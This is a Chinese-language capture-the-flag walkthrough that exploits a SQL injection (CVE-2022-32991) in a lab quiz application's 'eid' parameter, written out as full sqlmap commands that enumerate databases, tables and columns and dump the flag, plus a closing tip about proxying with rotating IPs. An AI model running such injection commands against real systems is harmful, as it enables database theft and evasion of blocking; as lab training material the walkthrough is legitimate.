### 春秋云镜（CVE-2022-32991）靶场操作流程

1. #### 进入靶场并注册登录

   进入靶场后，能看到登录和注册按钮。

   ![image-20250425204004014](.\images\image-20250425204004014.png)

   点击注册按钮，填写用户名（如 123）、邮箱（如 123@123.com ）、密码、学院名称（如 123）后完成注册，接着进行登录操作。

   ![image-20250425204035334](.\images\image-20250425204035334.png)

   ![image-20250425204110884](.\images\image-20250425204110884.png)

2. #### 寻找注入点

   登录成功后，点击首页第一个 “Start” 按钮，此时首页出现 PHP 报错，可忽略。

   ![image-20250425204124799](.\images\image-20250425204124799.png)

   ![image-20250425204142257](.\images\image-20250425204142257.png)

   发现页面存在 GET 传参，尝试后确定参数 “eid” 存在注入点。例如访问：http://eci-2ze92nbl08w2mlsza1bj.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&eid=60377db362694%27&n=18t=34发现页面出现报错提示。

   ![image-20250425204200188](.\images\image-20250425204200188.png)

3. #### 使用 sqlmap 进行注入检测

   由于之前进行了登录操作，需获取 Cookie。

   ![image-20250425204217300](.\images\image-20250425204217300.png)

   使用命令python sqlmap.py -u "http://eci-2ze92nbl08w2mlsza1bj.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&eid=60377db362694&n=1&t=34" --cookie="PHPSESSID=f6s7epn3k5p830etf6lckketn1" --batch -p "eid"检测参数 “eid” 是否存在注入。

   通过回显得知 “eid” 包含布尔注入、报错注入、时间盲注以及联合注入四种注入方式，且后端数据库管理系统为 MySQL。

   ![image-20250425204238880](.\images\image-20250425204238880.png)

4. #### 获取数据库、表、字段及内容

   **获取数据库**：使用命令python sqlmap.py -u "http://eci-2ze92nbl08w2mlsza1bj.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&eid=60377db362694&n=1&t=34" --cookie="PHPSESSID=f6s7epn3k5p830etf6lckketn1" --batch -p "eid" --dbs，成功获取四个数据库。
   
   ![image-20250425204253211](.\images\image-20250425204253211.png)
   
   **获取指定数据库中的表**：选择 “ctf” 数据库，使用命令python sqlmap.py -u "http://eci-2ze92nbl08w2mlsza1bj.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&eid=60377db362694&n=1&t=34" --cookie="PHPSESSID=f6s7epn3k5p830etf6lckketn1" --batch -p "eid" -D "ctf" --tables，获取到 “ctf” 数据库中的 “flag” 表等 9 张表。
   
   ![image-20250425204300983](.\images\image-20250425204300983.png)
   
   **获取指定表中的字段**：针对 “flag” 表，使用命令python sqlmap.py -u "http://eci-2ze92nbl08w2mlsza1bj.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&eid=60377db362694&n=1&t=34" --cookie="PHPSESSID=f6s7epn3k5p830etf6lckketn1" --batch -p "eid" -D "ctf" -T "flag" --columns，发现 “flag” 表中有一个名为 “flag” 的字段。
   
   ![image-20250425204308738](.\images\image-20250425204308738.png)
   
   **获取指定字段的内容**：使用命令python sqlmap.py -u "http://eci-2ze92nbl08w2mlsza1bj.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&eid=60377db362694&n=1&t=34" --cookie="PHPSESSID=f6s7epn3k5p830etf6lckketn1" --batch -p "eid" -D "ctf" -T "flag" -C "flag" --dump，成功获得 “flag” 字段中的内容，即得到 flag。
   
   ![image-20250425204314719](.\images\image-20250425204314719.png)



##### 注意：

作者在攻击靶场的适合使用了代理，同时开启了IP自动切换。如果有人的sqlmap无法正常链接的时候可以参考作者的做法。